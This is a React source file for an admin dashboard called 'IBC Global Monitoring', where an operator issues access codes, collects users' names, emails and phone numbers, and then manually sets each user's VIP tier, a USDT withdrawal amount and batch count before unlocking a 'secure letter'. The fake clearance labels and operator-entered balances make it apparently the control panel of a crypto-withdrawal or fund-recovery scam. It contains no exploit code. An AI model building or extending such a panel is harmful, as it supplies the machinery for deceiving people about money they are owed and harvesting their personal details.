import React, { useEffect, useState } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { 
  Table, 
  TableBody, 
  TableCell, 
  TableHead, 
  TableHeader, 
  TableRow 
} from "@/components/ui/table";
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle, DialogFooter } from "@/components/ui/dialog";
import { ShieldAlert, RefreshCw, Trash2, Lock, Search, Filter, Eye, FileText, Printer, Download, Plus, UserCheck } from "lucide-react";
import ibcLogo from "@assets/generated_images/professional_corporate_logo_for_international_blockchain_community.png";
import { useToast } from "@/hooks/use-toast";

interface AdminData {
  vipStatus: string;
  username: string;
  withdrawalAmount: string;
  withdrawalBatches: string;
  physilocal0: string;
}

interface Case {
  id: string;
  accessCode: string;
  status: 'created' | 'registered' | 'syncing' | 'active' | 'completed';
  userName?: string;
  userEmail?: string;
  userMobile?: string;
  vipStatus?: string;
  username?: string;
  withdrawalAmount?: string;
  withdrawalBatches?: string;
  physilocal0?: string;
  selectedOption?: string;
  submittedAt?: string;
}

export default function AdminDashboard() {
  const [cases, setCases] = useState<Case[]>([]);
  const [selectedCase, setSelectedCase] = useState<Case | null>(null);
  const [isCreateOpen, setIsCreateOpen] = useState(false);
  const [newAccessCode, setNewAccessCode] = useState("");
  const [isFinalizeOpen, setIsFinalizeOpen] = useState(false);
  const [finalizeData, setFinalizeData] = useState<AdminData>({
    vipStatus: "Gold Tier",
    username: "",
    withdrawalAmount: "500,000 USDT",
    withdrawalBatches: "10",
    physilocal0: "PHY-001"
  });
  
  const { toast } = useToast();

  const loadData = async () => {
    try {
      const response = await fetch('/api/cases');
      if (response.ok) {
        const data = await response.json();
        setCases(data);
      }
    } catch (error) {
      console.error('Failed to load cases:', error);
    }
  };

  useEffect(() => {
    loadData();
    // Poll for changes (simulating real-time updates from users)
    const interval = setInterval(loadData, 2000);
    return () => clearInterval(interval);
  }, []);

  const clearData = async () => {
    if(confirm("Clear all simulated records?")) {
      try {
        // Delete all cases
        await Promise.all(cases.map(c => 
          fetch(`/api/cases/${c.id}`, { method: 'DELETE' })
        ));
        loadData();
        toast({ title: "All cases cleared", description: "Database has been reset." });
      } catch (error) {
        toast({ variant: "destructive", title: "Error", description: "Failed to clear cases." });
      }
    }
  };

  const handleCreateCase = async () => {
    if (!newAccessCode) return;
    
    try {
      const response = await fetch('/api/cases', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          accessCode: newAccessCode,
          status: 'created'
        })
      });

      if (response.ok) {
        const newCase = await response.json();
        setIsCreateOpen(false);
        setNewAccessCode("");
        loadData();
        toast({ title: "Case Created", description: `Access Code: ${newCase.accessCode}` });
      } else {
        toast({ variant: "destructive", title: "Error", description: "Failed to create case." });
      }
    } catch (error) {
      toast({ variant: "destructive", title: "Error", description: "Failed to create case." });
    }
  };

  const openFinalizeModal = (c: Case) => {
    setSelectedCase(c);
    setFinalizeData({
      ...finalizeData,
      username: c.userName || ""
    });
    setIsFinalizeOpen(true);
  };

  const handleFinalize = async () => {
    if (!selectedCase) return;
    
    try {
      const response = await fetch(`/api/cases/${selectedCase.id}`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          status: 'active',
          vipStatus: finalizeData.vipStatus,
          username: finalizeData.username,
          withdrawalAmount: finalizeData.withdrawalAmount,
          withdrawalBatches: finalizeData.withdrawalBatches,
          physilocal0: finalizeData.physilocal0
        })
      });

      if (response.ok) {
        setIsFinalizeOpen(false);
        setSelectedCase(null);
        loadData();
        toast({ title: "Account Activated", description: "User can now access the secure letter." });
      } else {
        toast({ variant: "destructive", title: "Error", description: "Failed to finalize case." });
      }
    } catch (error) {
      toast({ variant: "destructive", title: "Error", description: "Failed to finalize case." });
    }
  };

  return (
    <div className="min-h-screen bg-slate-900 text-slate-100 font-sans">
      {/* Admin Header */}
      <header className="bg-slate-950 border-b border-slate-800 px-6 py-4 flex justify-between items-center">
        <div className="flex items-center gap-3">
           <img src={ibcLogo} alt="Logo" className="h-8 w-8 opacity-80 grayscale" />
           <div>
             <h1 className="font-bold text-lg tracking-tight text-white">IBC GLOBAL MONITORING</h1>
             <div className="flex items-center gap-2 text-[10px] uppercase tracking-wider text-slate-400">
               <span className="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse"></span>
               System Active • ISO-D Clearance Level 1
             </div>
           </div>
        </div>
        <div className="flex items-center gap-4">
          <div className="text-right hidden md:block">
            <p className="text-xs text-slate-400">Admin Session</p>
            <p className="text-sm font-bold text-white">Compliance Officer</p>
          </div>
          <div className="h-8 w-8 bg-slate-800 rounded-full flex items-center justify-center border border-slate-700">
            <Lock className="w-4 h-4 text-slate-400" />
          </div>
        </div>
      </header>

      <main className="p-6 max-w-7xl mx-auto">
        <div className="flex justify-between items-end mb-6">
          <div>
            <h2 className="text-2xl font-bold text-white mb-1">Case Management</h2>
            <p className="text-slate-400 text-sm">Manage secure access codes and approve synchronizations.</p>
          </div>
          <div className="flex gap-2">
            <Button onClick={() => setIsCreateOpen(true)} className="bg-blue-600 hover:bg-blue-700 text-white">
              <Plus className="w-4 h-4 mr-2" /> New Case
            </Button>
            <Button variant="destructive" size="sm" onClick={clearData}>
              <Trash2 className="w-4 h-4 mr-2" /> Clear Logs
            </Button>
          </div>
        </div>

        {/* Pending Actions Alert */}
        {cases.some(c => c.status === 'syncing') && (
          <div className="mb-6 bg-amber-500/10 border border-amber-500/20 rounded-lg p-4 flex items-center justify-between">
            <div className="flex items-center gap-3 text-amber-500">
              <ShieldAlert className="w-6 h-6 animate-pulse" />
              <div>
                <h3 className="font-bold">Action Required</h3>
                <p className="text-sm opacity-80">There are users waiting for synchronization approval.</p>
              </div>
            </div>
          </div>
        )}

        {/* Data Table */}
        <Card className="bg-slate-950 border-slate-800 overflow-hidden">
          <CardHeader className="border-b border-slate-800 bg-slate-900/50 py-4">
             <div className="flex justify-between items-center">
               <CardTitle className="text-base font-medium text-white">Active Cases</CardTitle>
               <div className="flex gap-2">
                 <Button variant="outline" size="sm" className="border-slate-700 bg-slate-800 text-slate-300" onClick={loadData}>
                   <RefreshCw className="w-4 h-4 mr-2" /> Refresh
                 </Button>
               </div>
             </div>
          </CardHeader>
          <div className="overflow-x-auto">
            <Table>
              <TableHeader className="bg-slate-900">
                <TableRow className="hover:bg-slate-900 border-slate-800">
                  <TableHead className="text-slate-400 w-[120px]">Status</TableHead>
                  <TableHead className="text-slate-400">Access Code</TableHead>
                  <TableHead className="text-slate-400">User Identity</TableHead>
                  <TableHead className="text-slate-400">Mobile / Email</TableHead>
                  <TableHead className="text-slate-400 text-center">Action</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {cases.length === 0 ? (
                  <TableRow className="hover:bg-transparent border-slate-800">
                    <TableCell colSpan={5} className="text-center py-12 text-slate-500">
                      No active cases. Create one to get started.
                    </TableCell>
                  </TableRow>
                ) : (
                  cases.map((c) => (
                    <TableRow key={c.id} className="hover:bg-slate-900/50 border-slate-800 group">
                      <TableCell>
                        <Badge variant="outline" className={`
                          ${c.status === 'created' ? 'text-slate-400 border-slate-700' : ''}
                          ${c.status === 'registered' ? 'text-blue-400 border-blue-700 bg-blue-500/10' : ''}
                          ${c.status === 'syncing' ? 'text-amber-400 border-amber-700 bg-amber-500/10 animate-pulse' : ''}
                          ${c.status === 'active' ? 'text-green-400 border-green-700 bg-green-500/10' : ''}
                          ${c.status === 'completed' ? 'text-purple-400 border-purple-700 bg-purple-500/10' : ''}
                        `}>
                          {c.status.toUpperCase()}
                        </Badge>
                      </TableCell>
                      <TableCell className="font-mono text-white font-bold tracking-wider">{c.accessCode}</TableCell>
                      <TableCell className="text-slate-300">
                        {c.userName ? (
                           <div className="font-medium text-white">{c.userName}</div>
                        ) : (
                          <span className="text-slate-600 italic">Pending Login...</span>
                        )}
                      </TableCell>
                      <TableCell className="text-slate-400 text-sm">
                        {c.userEmail ? (
                          <div className="flex flex-col">
                            <span>{c.userEmail}</span>
                            <span className="text-xs opacity-70">{c.userMobile}</span>
                          </div>
                        ) : (
                          "-"
                        )}
                      </TableCell>
                      <TableCell className="text-center">
                        {c.status === 'syncing' && (
                          <Button 
                            size="sm" 
                            className="bg-amber-600 hover:bg-amber-700 text-white w-full"
                            onClick={() => openFinalizeModal(c)}
                          >
                            Finalize Sync
                          </Button>
                        )}
                        {c.status === 'completed' && c.selectedOption && (
                          <Badge variant="secondary">Option {c.selectedOption}</Badge>
                        )}
                      </TableCell>
                    </TableRow>
                  ))
                )}
              </TableBody>
            </Table>
          </div>
        </Card>
      </main>

      {/* Create Case Modal */}
      <Dialog open={isCreateOpen} onOpenChange={setIsCreateOpen}>
        <DialogContent className="bg-slate-950 border-slate-800 text-slate-100">
          <DialogHeader>
            <DialogTitle>Create Secure Access Case</DialogTitle>
            <DialogDescription className="text-slate-400">
              Generate a unique password for the user to access the portal.
            </DialogDescription>
          </DialogHeader>
          <div className="py-4">
            <Label htmlFor="code" className="text-slate-400">Access Password</Label>
            <Input 
              id="code" 
              value={newAccessCode} 
              onChange={(e) => setNewAccessCode(e.target.value)}
              className="bg-slate-900 border-slate-700 text-white mt-2"
              placeholder="e.g. 774982" 
            />
          </div>
          <DialogFooter>
            <Button variant="ghost" onClick={() => setIsCreateOpen(false)}>Cancel</Button>
            <Button onClick={handleCreateCase} className="bg-blue-600 text-white">Create Case</Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Finalize Sync Modal */}
      <Dialog open={isFinalizeOpen} onOpenChange={setIsFinalizeOpen}>
        <DialogContent className="bg-slate-950 border-slate-800 text-slate-100">
          <DialogHeader>
            <DialogTitle>Finalize Account Reactivation</DialogTitle>
            <DialogDescription className="text-slate-400">
              Input user details to complete synchronization.
            </DialogDescription>
          </DialogHeader>
          
          <div className="grid gap-4 py-4">
            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-2">
                <Label className="text-slate-400">VIP Status</Label>
                <Input 
                  value={finalizeData.vipStatus}
                  onChange={(e) => setFinalizeData({...finalizeData, vipStatus: e.target.value})}
                  className="bg-slate-900 border-slate-700 text-white"
                />
              </div>
              <div className="space-y-2">
                <Label className="text-slate-400">Physilocal0</Label>
                <Input 
                  value={finalizeData.physilocal0}
                  onChange={(e) => setFinalizeData({...finalizeData, physilocal0: e.target.value})}
                  className="bg-slate-900 border-slate-700 text-white"
                />
              </div>
            </div>

            <div className="space-y-2">
              <Label className="text-slate-400">Username</Label>
              <Input 
                value={finalizeData.username}
                onChange={(e) => setFinalizeData({...finalizeData, username: e.target.value})}
                className="bg-slate-900 border-slate-700 text-white"
              />
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-2">
                <Label className="text-slate-400">Withdrawal Amount</Label>
                <Input 
                  value={finalizeData.withdrawalAmount}
                  onChange={(e) => setFinalizeData({...finalizeData, withdrawalAmount: e.target.value})}
                  className="bg-slate-900 border-slate-700 text-white"
                />
              </div>
              <div className="space-y-2">
                <Label className="text-slate-400">Batches</Label>
                <Input 
                  value={finalizeData.withdrawalBatches}
                  onChange={(e) => setFinalizeData({...finalizeData, withdrawalBatches: e.target.value})}
                  className="bg-slate-900 border-slate-700 text-white"
                />
              </div>
            </div>
          </div>

          <DialogFooter>
            <Button variant="ghost" onClick={() => setIsFinalizeOpen(false)}>Cancel</Button>
            <Button onClick={handleFinalize} className="bg-green-600 hover:bg-green-700 text-white gap-2">
              <UserCheck className="w-4 h-4" /> Accept & Finalize
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  );
}
